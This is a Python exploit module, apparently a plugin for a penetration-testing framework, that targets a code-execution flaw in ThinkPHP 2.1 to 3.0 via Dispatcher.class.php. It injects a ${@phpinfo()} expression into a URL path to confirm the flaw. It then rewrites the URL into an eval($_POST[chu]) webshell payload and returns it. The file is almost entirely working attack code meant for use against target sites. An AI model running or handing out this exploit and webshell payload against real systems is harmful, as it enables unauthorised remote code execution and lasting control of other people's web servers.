#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.http import http
from modules.plugins import logger

author = "Chu <root@sh3ll.me>"
title = "ThinkPHP 2.1,2.2,3.0"
description = "Dispatcher.class.php 代码执行"
reference = "http://sebug.net/vuldb/ssvid-60054"
options = {
    'target':'http://www.xxoo.com'
}

def exploit(options):
    url = options['target']['current_value']
    url = url + "/index.php/module/aciton/param1/${@phpinfo()}"
    logger.process("Requesting target site")
    response = http.get(url)
    if "<title>phpinfo()</title>" in response.text:
        logger.success("Exploitable!")
        logger.success("Phpinfo: %s" % url)
        url = url.replace("@phpinfo()", "@print(eval($_POST[chu]))")
        logger.success("Webshell: %s" % url)
        return url
